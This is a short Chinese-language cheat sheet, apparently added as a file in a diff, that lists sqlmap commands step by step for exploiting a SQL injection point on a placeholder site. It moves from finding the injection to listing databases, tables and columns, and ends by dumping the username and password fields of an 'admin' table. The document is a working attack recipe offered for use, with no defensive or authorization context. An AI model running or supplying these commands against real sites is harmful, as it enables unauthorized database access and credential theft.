@@ -1,0 +1,48 @@
+
+
+                                           作者：拿破飞机
+---------------------------------------------------------------------------------------------
+
+1.判断注入点，获取网站信息
+
+sqlmap.py -u http://www.xx.com/ss.asp?id=123
+
+例：
+sqlmap.py -u "http://www.xx.com/ss.asp?id=123"
+
+
+2.获取所有数据库
+
+sqlmap.py -u http://www.xx.com/ss.asp?id=123 --dbs
+
+例：
+sqlmap.py -u "http://www.xx.com/ss.asp?id=123" --dbs
+
+
+3.获取网站当前所使用的数据库
+
+sqlmap.py -u http://www.xx.com/ss.asp?id=123 --current-db
+
+例:
+sqlmap.py -u "http://www.xx.com/ss.asp?id=123" --current-db
+
+
+4.获取数据库中的表名
+
+sqlmap.py -u http://www.xx.com/ss.asp?id=123 -D 数据库名 --tables
+
+例：
+sqlmap.py -u "http://www.xx.com/ss.asp?id=123" -D news2008 --tables
+
+
+5.获取数据表中的字段名
+sqlmap.py -u http://www.xx.com/ss.asp?id=123 -D 数据库名 -T 表名 --columns
+
+例：
+sqlmap.py -u "http://www.xx.com/ss.asp?id=123" -D news2008 -T admin --columns
+
+6.获取字段中的内容
+sqlmap.py -u http://www.xx.com/ss.asp?id=123 -D 数据库名 -T 表名 -C "字段名1,字段名2..." --dump
+
+例：
+sqlmap.py -u "http://www.xx.com/ss.asp?id=123" -D news2008 -T admin -C "username,psw" --dump
